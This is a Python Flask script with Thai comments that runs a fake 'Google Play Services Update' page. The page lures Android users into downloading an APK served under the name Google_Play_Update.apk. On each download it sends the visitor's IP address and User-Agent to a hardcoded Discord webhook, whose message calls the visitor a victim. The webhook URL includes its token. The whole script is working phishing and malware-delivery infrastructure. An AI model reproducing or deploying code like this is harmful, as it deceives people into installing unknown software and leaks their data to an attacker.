import os
import time
import json
import requests
from flask import Flask, send_file, render_template_string, request

app = Flask(__name__)

# Discord Webhook ของมึง
WEBHOOK_URL = "https://discord.com/api/webhooks/1525496997417717924/2XhKXiq5gHrepV5H8uDzECt2JOGBknizoq2VwN4CqbO6Vb1OSqSZ0u-eZZgQv232xAZb"
APK_FILENAME = "app.apk"  # เปลี่ยนชื่อไฟล์ให้ตรงกับ APK ที่มึงจะอัปโหลดขึ้น GitHub!

@app.route('/')
def index():
    # ส่งหน้าเว็บ HTML ให้คนเข้ามาเห็น
    return render_template_string(HTML_PAGE)

@app.route('/download')
def download_apk():
    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr
    
    # แจ้งเตือน Webhook ว่ามีใครโหลด APK ไปแล้ว!
    data = {
        "content": f"🔥 **มีเหยื่อกดดาวน์โหลด APK แล้ว!**\n🌐 **IP:** `{ip}`\n🖥️ **User-Agent:** `{user_agent}`\n📱 **ไฟล์ที่โหลด:** `{APK_FILENAME}`"
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass
        
    # ส่งไฟล์ APK ให้โหลด
    return send_file(APK_FILENAME, as_attachment=True, download_name="Google_Play_Update.apk")

# HTML หน้าตาเว็บให้ดูเหมือนแอปจริงๆ (เนียนๆ)
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Google Play Services Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; flex-direction: column; }
        .box { background: #f8f9fa; padding: 30px; border-radius: 16px; text-align: center; max-width: 350px; width: 90%; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        h1 { font-size: 20px; color: #202124; margin-bottom: 5px; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
        .btn { background: #1a73e8; color: #fff; border: none; padding: 14px 30px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; text-decoration: none; display: inline-block; box-sizing: border-box; }
        .btn:hover { background: #1557b0; }
        .small { color: #888; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>📱 พบการอัปเดตที่สำคัญ</h1>
        <p>Google Play Service จำเป็นต้องอัปเดตเพื่อให้แอปทำงานได้</p>
        <a href="/download" class="btn" onclick="alert('กำลังเริ่มดาวน์โหลด...')">📥 ดาวน์โหลดและติดตั้งตอนนี้</a>
        <div class="small">แนะนำให้ติดตั้งเพื่อประสิทธิภาพสูงสุด</div>
    </div>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)